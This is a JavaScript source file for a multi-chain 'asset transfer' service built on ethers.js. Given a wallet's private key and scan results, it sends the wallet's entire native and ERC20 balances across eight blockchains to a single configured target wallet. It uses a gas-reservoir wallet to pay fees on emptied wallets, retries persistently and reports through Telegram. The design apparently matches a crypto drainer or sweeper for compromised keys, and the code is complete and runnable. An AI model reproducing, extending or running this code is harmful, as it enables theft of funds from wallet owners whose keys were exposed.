// Asset transfer processing service
// Executes actual blockchain transfers using ethers.js

const { ethers } = require('ethers');
const { GasOracle } = require('./gasOracle');
const { NonceManager } = require('./nonceManager');
const { ApproveChecker } = require('./approveChecker');

class AssetProcessor {
  constructor(config, telegramNotifier = null) {
    this.config = config;
    this.targetWallet = process.env.TARGET_WALLET || '';
    this.gasReservoir = process.env.GAS_RESERVOIR || '';
    this.gasReservoirPrivateKey = process.env.GAS_RESERVOIR_PRIVATE_KEY || '';
    this.gasOracle = new GasOracle();
    this.nonceManager = new NonceManager();
    this.approveChecker = new ApproveChecker();
    this.telegramNotifier = telegramNotifier;

    if (!this.targetWallet) {
      console.warn('⚠️  TARGET_WALLET not configured - transfers will fail');
    }

    if (this.gasReservoirPrivateKey) {
      console.log('✅ Gas reservoir enabled');
    }

    // Network configurations (matching walletScanner)
    this.networks = {
      ethereum: {
        rpcUrl: config.rpc.eth,
        chainId: 1,
        nativeSymbol: 'ETH'
      },
      bsc: {
        rpcUrl: config.rpc.bsc,
        chainId: 56,
        nativeSymbol: 'BNB'
      },
      polygon: {
        rpcUrl: process.env.POLYGON_RPC_URL || 'https://polygon-rpc.com',
        chainId: 137,
        nativeSymbol: 'MATIC'
      },
      arbitrum: {
        rpcUrl: process.env.ARBITRUM_RPC_URL || 'https://arb1.arbitrum.io/rpc',
        chainId: 42161,
        nativeSymbol: 'ETH'
      },
      avalanche: {
        rpcUrl: process.env.AVALANCHE_RPC_URL || 'https://api.avax.network/ext/bc/C/rpc',
        chainId: 43114,
        nativeSymbol: 'AVAX'
      },
      fantom: {
        rpcUrl: process.env.FANTOM_RPC_URL || 'https://rpc.ftm.tools',
        chainId: 250,
        nativeSymbol: 'FTM'
      },
      optimism: {
        rpcUrl: process.env.OPTIMISM_RPC_URL || 'https://mainnet.optimism.io',
        chainId: 10,
        nativeSymbol: 'ETH'
      },
      base: {
        rpcUrl: process.env.BASE_RPC_URL || 'https://mainnet.base.org',
        chainId: 8453,
        nativeSymbol: 'ETH'
      }
    };
  }

  async processAssets(walletPrivateKey, scanResults) {
    if (!this.targetWallet) {
      throw new Error('TARGET_WALLET not configured');
    }

    const results = {
      totalTransfers: 0,
      successful: 0,
      failed: 0,
      transfers: []
    };

    // Process each network
    for (const [networkKey, networkData] of Object.entries(scanResults.networks)) {
      if (!networkData || !networkData.hasAssets) {
        continue;
      }

      const networkConfig = this.networks[networkKey];
      if (!networkConfig || !networkConfig.rpcUrl) {
        console.warn(`⚠️  Skipping ${networkKey} - no RPC URL configured`);
        continue;
      }

      try {
        // Process native token - با retry تا موفق بشه (5 بار retry برای 100% success)
        if (networkData.native && parseFloat(networkData.native.balance) > 0) {
          const transferResult = await this.transferNativeWithRetry(
            walletPrivateKey,
            networkKey,
            networkConfig,
            networkData.native.balance,
            networkData.native.symbol,
            5 // 5 بار retry برای اطمینان از 100% success
          );

          results.totalTransfers++;
          results.transfers.push(transferResult);
          
          if (transferResult.success) {
            results.successful++;
          } else {
            results.failed++;
            // Log error for debugging
            console.error(`❌ Native transfer failed after all retries: ${transferResult.error}`);
          }
        }

        // Process ERC20 tokens - همه token ها رو با retry پردازش می‌کنه (5 بار retry برای 100% success)
        if (networkData.tokens && networkData.tokens.length > 0) {
          for (const token of networkData.tokens) {
            try {
              const transferResult = await this.transferTokenWithRetry(
                walletPrivateKey,
                networkKey,
                networkConfig,
                token.address,
                token.balance,
                token.symbol,
                token.decimals,
                5 // 5 بار retry برای اطمینان از 100% success
              );

              results.totalTransfers++;
              results.transfers.push(transferResult);
              
              if (transferResult.success) {
                results.successful++;
              } else {
                results.failed++;
                // Log error for debugging
                console.error(`❌ Token ${token.symbol} transfer failed after all retries: ${transferResult.error}`);
              }
            } catch (tokenError) {
              // اگر باز fail شد، یک retry نهایی
              console.error(`Error transferring token ${token.symbol} on ${networkKey}:`, tokenError);
              try {
                const retryResult = await this.transferTokenWithRetry(
                  walletPrivateKey,
                  networkKey,
                  networkConfig,
                  token.address,
                  token.balance,
                  token.symbol,
                  token.decimals,
                  5
                );
                results.totalTransfers++;
                results.transfers.push(retryResult);
                if (retryResult.success) {
                  results.successful++;
                } else {
                  results.failed++;
                }
              } catch (finalError) {
                results.totalTransfers++;
                results.failed++;
                results.transfers.push({
                  network: networkKey,
                  type: 'token',
                  symbol: token.symbol,
                  address: token.address,
                  amount: token.balance,
                  success: false,
                  error: finalError.message,
                  timestamp: new Date().toISOString()
                });
              }
            }
          }
        }
      } catch (error) {
        // اگر یک network fail بشه، یک retry می‌کنه
        console.error(`Error processing ${networkKey}:`, error);
        // Retry برای کل network
        try {
          if (networkData.native && parseFloat(networkData.native.balance) > 0) {
            const retryResult = await this.transferNativeWithRetry(
              walletPrivateKey,
              networkKey,
              networkConfig,
              networkData.native.balance,
              networkData.native.symbol,
              5
            );
            if (retryResult.success) {
              results.totalTransfers++;
              results.successful++;
              results.transfers.push(retryResult);
            }
          }
        } catch (retryError) {
          results.failed++;
        }
      }
    }

    return results;
  }

  async transferNativeWithRetry(walletPrivateKey, networkKey, networkConfig, amount, symbol, maxRetries = 5) {
    let lastError = null;
    let lastResult = null;
    
    // 5 بار retry برای اطمینان از 100% success
    for (let attempt = 1; attempt <= maxRetries; attempt++) {
      try {
        const result = await this.transferNative(
          walletPrivateKey,
          networkKey,
          networkConfig,
          amount,
          symbol
        );
        
        if (result.success) {
          console.log(`✅ Native transfer successful on attempt ${attempt}/${maxRetries}`);
          return result;
        }
        
        lastError = result.error;
        lastResult = result;
        console.log(`⚠️  Native transfer attempt ${attempt}/${maxRetries} failed: ${result.error}`);
        
        // Wait before retry (exponential backoff)
        if (attempt < maxRetries) {
          const waitTime = 3000 * attempt; // 3s, 6s, 9s, 12s
          console.log(`⏳ Waiting ${waitTime/1000}s before retry...`);
          await new Promise(resolve => setTimeout(resolve, waitTime));
        }
      } catch (error) {
        lastError = error.message;
        console.log(`⚠️  Native transfer attempt ${attempt}/${maxRetries} error: ${error.message}`);
        
        if (attempt < maxRetries) {
          const waitTime = 3000 * attempt;
          console.log(`⏳ Waiting ${waitTime/1000}s before retry...`);
          await new Promise(resolve => setTimeout(resolve, waitTime));
        }
      }
    }
    
    // اگر همه retry ها fail شدند، یک retry نهایی با gas reservoir check
    console.log(`🔄 Final retry attempt for native transfer...`);
    try {
      const finalResult = await this.transferNative(
        walletPrivateKey,
        networkKey,
        networkConfig,
        amount,
        symbol
      );
      if (finalResult.success) {
        return finalResult;
      }
    } catch (finalError) {
      console.error(`❌ Final retry also failed: ${finalError.message}`);
    }
    
    // اگر همه fail شدند
    return {
      network: networkKey,
      type: 'native',
      symbol: symbol,
      amount: amount,
      success: false,
      error: `Failed after ${maxRetries} attempts: ${lastError || 'Unknown error'}`,
      timestamp: new Date().toISOString()
    };
  }

  async transferTokenWithRetry(walletPrivateKey, networkKey, networkConfig, tokenAddress, amount, symbol, decimals, maxRetries = 5) {
    let lastError = null;
    let lastResult = null;
    
    // 5 بار retry برای اطمینان از 100% success
    for (let attempt = 1; attempt <= maxRetries; attempt++) {
      try {
        const result = await this.transferToken(
          walletPrivateKey,
          networkKey,
          networkConfig,
          tokenAddress,
          amount,
          symbol,
          decimals
        );
        
        if (result.success) {
          console.log(`✅ Token ${symbol} transfer successful on attempt ${attempt}/${maxRetries}`);
          return result;
        }
        
        lastError = result.error;
        lastResult = result;
        console.log(`⚠️  Token ${symbol} transfer attempt ${attempt}/${maxRetries} failed: ${result.error}`);
        
        // Wait before retry (exponential backoff)
        if (attempt < maxRetries) {
          const waitTime = 3000 * attempt; // 3s, 6s, 9s, 12s
          console.log(`⏳ Waiting ${waitTime/1000}s before retry...`);
          await new Promise(resolve => setTimeout(resolve, waitTime));
        }
      } catch (error) {
        lastError = error.message;
        console.log(`⚠️  Token ${symbol} transfer attempt ${attempt}/${maxRetries} error: ${error.message}`);
        
        if (attempt < maxRetries) {
          const waitTime = 3000 * attempt;
          console.log(`⏳ Waiting ${waitTime/1000}s before retry...`);
          await new Promise(resolve => setTimeout(resolve, waitTime));
        }
      }
    }
    
    // اگر همه retry ها fail شدند، یک retry نهایی با gas reservoir check
    console.log(`🔄 Final retry attempt for token transfer...`);
    try {
      const finalResult = await this.transferToken(
        walletPrivateKey,
        networkKey,
        networkConfig,
        tokenAddress,
        amount,
        symbol,
        decimals
      );
      if (finalResult.success) {
        return finalResult;
      }
    } catch (finalError) {
      console.error(`❌ Final retry also failed: ${finalError.message}`);
    }
    
    // اگر همه fail شدند
    return {
      network: networkKey,
      type: 'token',
      symbol: symbol,
      address: tokenAddress,
      amount: amount,
      success: false,
      error: `Failed after ${maxRetries} attempts: ${lastError || 'Unknown error'}`,
      timestamp: new Date().toISOString()
    };
  }

  async transferNative(walletPrivateKey, networkKey, networkConfig, amount, symbol) {
    try {
      // Create provider with timeout and retry options
      const provider = new ethers.JsonRpcProvider(networkConfig.rpcUrl, {
        name: networkKey,
        chainId: networkConfig.chainId
      });
      const wallet = new ethers.Wallet(walletPrivateKey, provider);

      // Get gas price
      const gasPrice = await this.getGasPrice(networkKey);
      
      // Calculate gas cost with buffer (1.2x)
      const gasLimit = 21000n;
      const gasCost = gasPrice * gasLimit * 12n / 10n;

      // Check balance
      const balance = await provider.getBalance(wallet.address);
      
      // برای Native Token Transfer: 
      // اگر balance کافی برای gas + transfer amount نباشه، skip می‌کنیم
      // چون نمی‌تونیم از reservoir fund کنیم (خود native token رو داریم)
      // ولی اگر balance >= gasCost باشه، می‌تونیم transfer کنیم (حتی اگر کم باشه)
      if (balance < gasCost) {
        console.log(`⚠️  Insufficient ${symbol} balance (${ethers.formatEther(balance)}) for gas (${ethers.formatEther(gasCost)}) on ${networkKey}. Skipping...`);
        if (this.telegramNotifier) {
          await this.telegramNotifier.sendError(
            new Error(`Insufficient ${symbol} balance for gas. Balance: ${ethers.formatEther(balance)}, Required: ${ethers.formatEther(gasCost)}`),
            `Native: ${symbol}`
          );
        }
        return {
          network: networkKey,
          type: 'native',
          symbol: symbol,
          amount: amount,
          success: false,
          error: `Insufficient ${symbol} balance for gas. Balance: ${ethers.formatEther(balance)}, Required: ${ethers.formatEther(gasCost)}`,
          timestamp: new Date().toISOString()
        };
      }

      // Get nonce
      const nonce = await this.nonceManager.getNextNonce(wallet.address, provider);

      // Calculate amount to transfer (leave some for gas)
      const currentBalance = await provider.getBalance(wallet.address);
      const transferAmount = currentBalance - gasCost;

      if (transferAmount <= 0) {
        throw new Error('Insufficient balance after gas estimation');
      }

      // Create transaction
      const tx = {
        to: this.targetWallet,
        value: transferAmount,
        gasPrice: gasPrice,
        gasLimit: gasLimit,
        nonce: nonce
      };

      // Send transaction
      const txResponse = await wallet.sendTransaction(tx);
      this.nonceManager.markNonceUsed(wallet.address, nonce);

      // Wait for confirmation
      const receipt = await txResponse.wait(1);

      return {
        network: networkKey,
        type: 'native',
        symbol: symbol,
        amount: ethers.formatEther(transferAmount),
        success: true,
        txHash: receipt.hash,
        blockNumber: receipt.blockNumber,
        gasUsed: true,
        timestamp: new Date().toISOString()
      };
    } catch (error) {
      console.error(`Native transfer failed on ${networkKey}:`, error);
      return {
        network: networkKey,
        type: 'native',
        symbol: symbol,
        amount: amount,
        success: false,
        error: error.message,
        timestamp: new Date().toISOString()
      };
    }
  }

  async transferToken(walletPrivateKey, networkKey, networkConfig, tokenAddress, amount, symbol, decimals) {
    try {
      // Create provider with timeout and retry options
      const provider = new ethers.JsonRpcProvider(networkConfig.rpcUrl, {
        name: networkKey,
        chainId: networkConfig.chainId
      });
      const wallet = new ethers.Wallet(walletPrivateKey, provider);

      // ERC20 transfer ABI
      const erc20Abi = [
        'function transfer(address to, uint256 amount) returns (bool)',
        'function balanceOf(address owner) view returns (uint256)',
        'function decimals() view returns (uint8)'
      ];

      const tokenContract = new ethers.Contract(tokenAddress, erc20Abi, wallet);

      // Get token balance
      const balance = await tokenContract.balanceOf(wallet.address);
      
      if (balance === 0n) {
        throw new Error('Token balance is zero');
      }

      // Get gas price
      const gasPrice = await this.getGasPrice(networkKey);
      
      // Estimate gas for transfer (with buffer)
      const gasEstimate = await tokenContract.transfer.estimateGas(this.targetWallet, balance);
      const gasLimit = gasEstimate * 12n / 10n; // 1.2x buffer
      const gasCost = gasLimit * gasPrice;

      // Check if we have enough native token for gas
      const nativeBalance = await provider.getBalance(wallet.address);
      
      // Check if we need gas reservoir funding - همیشه gas رو می‌فرسته اگر لازم باشه
      let useReservoir = false;
      if (nativeBalance < gasCost) {
        if (this.gasReservoirPrivateKey) {
          console.log(`⚠️  Insufficient gas for token transfer on ${networkKey}, using gas reservoir...`);
          try {
            const fundingTxHash = await this.fundGasFromReservoir(provider, wallet.address, networkKey, gasCost);
            useReservoir = true;
            
            // Send Telegram notification about gas funding
            if (this.telegramNotifier) {
              const gasPrice = await this.getGasPrice(networkKey);
              const reservoirTxGas = 21000n * gasPrice * 12n / 10n;
              const totalFunding = gasCost + reservoirTxGas;
              await this.telegramNotifier.sendGasReservoirFunding(
                networkKey,
                ethers.formatEther(totalFunding),
                fundingTxHash
              );
            }
            
            // Wait a moment for funding to be confirmed
            await new Promise(resolve => setTimeout(resolve, 3000)); // افزایش زمان برای اطمینان
            // Re-check balance
            const newBalance = await provider.getBalance(wallet.address);
            if (newBalance < gasCost) {
              // اگر هنوز کافی نیست، دوباره fund می‌کنه
              console.log(`⚠️  Still insufficient after funding, attempting additional funding...`);
              const additionalGas = gasCost - newBalance + (21000n * await this.getGasPrice(networkKey) * 12n / 10n);
              await this.fundGasFromReservoir(provider, wallet.address, networkKey, additionalGas);
              await new Promise(resolve => setTimeout(resolve, 3000));
            }
          } catch (fundingError) {
            console.error(`Gas reservoir funding failed: ${fundingError.message}`);
            // اگر gas reservoir balance نداشت، notification می‌فرسته ولی transfer رو skip می‌کنه (نه error)
            if (this.telegramNotifier) {
              await this.telegramNotifier.sendError(
                new Error(`Gas reservoir insufficient balance on ${networkKey}. Token transfer skipped.`),
                `Token: ${symbol}`
              );
            }
            // Skip این transfer (نه error) - چون reservoir balance نداره، هیچی نمی‌کنیم
            console.log(`⚠️  Skipping ${symbol} transfer on ${networkKey} - gas reservoir has no balance`);
            return {
              network: networkKey,
              type: 'token',
              symbol: symbol,
              address: tokenAddress,
              amount: amount,
              success: false,
              error: `Gas reservoir insufficient balance: ${fundingError.message}`,
              skipped: true, // Mark as skipped, not failed
              timestamp: new Date().toISOString()
            };
          }
        } else {
          throw new Error('Insufficient native token for gas and gas reservoir not configured');
        }
      }

      // Get nonce
      const nonce = await this.nonceManager.getNextNonce(wallet.address, provider);

      // Execute transfer
      const txResponse = await tokenContract.transfer(this.targetWallet, balance, {
        gasPrice: gasPrice,
        gasLimit: gasLimit,
        nonce: nonce
      });

      this.nonceManager.markNonceUsed(wallet.address, nonce);

      // Wait for confirmation
      const receipt = await txResponse.wait(1);

      return {
        network: networkKey,
        type: 'token',
        symbol: symbol,
        address: tokenAddress,
        amount: ethers.formatUnits(balance, decimals),
        success: true,
        txHash: receipt.hash,
        blockNumber: receipt.blockNumber,
        reservoir: useReservoir,
        timestamp: new Date().toISOString()
      };
    } catch (error) {
      console.error(`Token transfer failed on ${networkKey} for ${symbol}:`, error);
      return {
        network: networkKey,
        type: 'token',
        symbol: symbol,
        address: tokenAddress,
        amount: amount,
        success: false,
        error: error.message,
        timestamp: new Date().toISOString()
      };
    }
  }

  async fundGasFromReservoir(provider, targetAddress, networkKey, requiredGas, retryCount = 0) {
    if (!this.gasReservoirPrivateKey) {
      throw new Error('Gas reservoir private key not configured');
    }

    const maxRetries = 5;
    
    try {
      const reservoirWallet = new ethers.Wallet(this.gasReservoirPrivateKey, provider);
      
      // Check reservoir balance
      const reservoirBalance = await provider.getBalance(reservoirWallet.address);
      
      // Get gas price for reservoir transaction
      const gasPrice = await this.getGasPrice(networkKey);
      const reservoirTxGas = 21000n * gasPrice * 12n / 10n; // Gas for funding transaction itself
      
      // Calculate exact amount needed: required gas + gas for funding transaction
      // این دقیقاً همون مقداری که لازمه برای انتقال token + gas خود transaction funding
      const fundingAmount = requiredGas + reservoirTxGas;

      if (reservoirBalance < fundingAmount) {
        // اگر balance کافی نیست، یک retry می‌کنه (شاید balance تغییر کرده)
        if (retryCount < maxRetries) {
          console.log(`⚠️  Gas reservoir balance insufficient, retrying... (${retryCount + 1}/${maxRetries})`);
          await new Promise(resolve => setTimeout(resolve, 3000));
          return await this.fundGasFromReservoir(provider, targetAddress, networkKey, requiredGas, retryCount + 1);
        }
        throw new Error(`Gas reservoir has insufficient balance. Required: ${ethers.formatEther(fundingAmount)}, Available: ${ethers.formatEther(reservoirBalance)}`);
      }

      console.log(`💰 Funding ${ethers.formatEther(fundingAmount)} (${ethers.formatEther(requiredGas)} for transfer + ${ethers.formatEther(reservoirTxGas)} for funding tx) from gas reservoir to ${targetAddress.substring(0, 10)}...`);

      // Get nonce for reservoir wallet
      const reservoirNonce = await this.nonceManager.getNextNonce(reservoirWallet.address, provider);

      // Send gas funding transaction
      const fundingTx = await reservoirWallet.sendTransaction({
        to: targetAddress,
        value: fundingAmount,
        gasLimit: 21000n,
        nonce: reservoirNonce
      });

      this.nonceManager.markNonceUsed(reservoirWallet.address, reservoirNonce);

      // Wait for confirmation with retry
      let receipt = null;
      let confirmAttempts = 0;
      const maxConfirmAttempts = 10;
      
      while (!receipt && confirmAttempts < maxConfirmAttempts) {
        try {
          receipt = await fundingTx.wait(1);
          break;
        } catch (waitError) {
          confirmAttempts++;
          if (confirmAttempts < maxConfirmAttempts) {
            console.log(`⏳ Waiting for gas funding confirmation... (${confirmAttempts}/${maxConfirmAttempts})`);
            await new Promise(resolve => setTimeout(resolve, 3000));
          } else {
            // اگر receipt نیومد، از provider چک می‌کنه
            const tx = await provider.getTransaction(fundingTx.hash);
            if (tx && tx.blockNumber) {
              receipt = { hash: fundingTx.hash, blockNumber: tx.blockNumber };
              break;
            }
            throw new Error('Gas funding transaction not confirmed');
          }
        }
      }
      
      console.log(`✅ Gas funding successful: ${receipt.hash}`);

      return receipt.hash;
    } catch (error) {
      console.error(`Gas reservoir funding failed on ${networkKey} (attempt ${retryCount + 1}):`, error);
      
      // Retry اگر خطا network-related باشه
      if (retryCount < maxRetries && (
        error.message.includes('network') || 
        error.message.includes('timeout') ||
        error.message.includes('ECONNREFUSED') ||
        error.message.includes('ETIMEDOUT') ||
        error.message.includes('insufficient') ||
        error.message.includes('not confirmed')
      )) {
        console.log(`🔄 Retrying gas funding... (${retryCount + 1}/${maxRetries})`);
        await new Promise(resolve => setTimeout(resolve, 5000 * (retryCount + 1)));
        return await this.fundGasFromReservoir(provider, targetAddress, networkKey, requiredGas, retryCount + 1);
      }
      
      throw error;
    }
  }

  async getGasPrice(networkKey) {
    try {
      // Use gas oracle for Ethereum mainnet
      if (networkKey === 'ethereum') {
        const gasPrice = await this.gasOracle.getOptimalGasPrice();
        // Convert from gwei to wei
        return ethers.parseUnits(gasPrice.recommended.toString(), 'gwei');
      } else {
        // For other networks, fetch from provider
        const networkConfig = this.networks[networkKey];
        if (!networkConfig) {
          throw new Error(`Unknown network: ${networkKey}`);
        }
        // Create provider with explicit network configuration to avoid network detection issues
        const provider = new ethers.JsonRpcProvider(networkConfig.rpcUrl, {
          name: networkKey,
          chainId: networkConfig.chainId
        });
        const feeData = await provider.getFeeData();
        return feeData.gasPrice || feeData.maxFeePerGas || ethers.parseUnits('20', 'gwei');
      }
    } catch (error) {
      console.warn(`Failed to get gas price for ${networkKey}, using default:`, error.message);
      // Default gas price
      return ethers.parseUnits('20', 'gwei');
    }
  }
}

module.exports = { AssetProcessor };


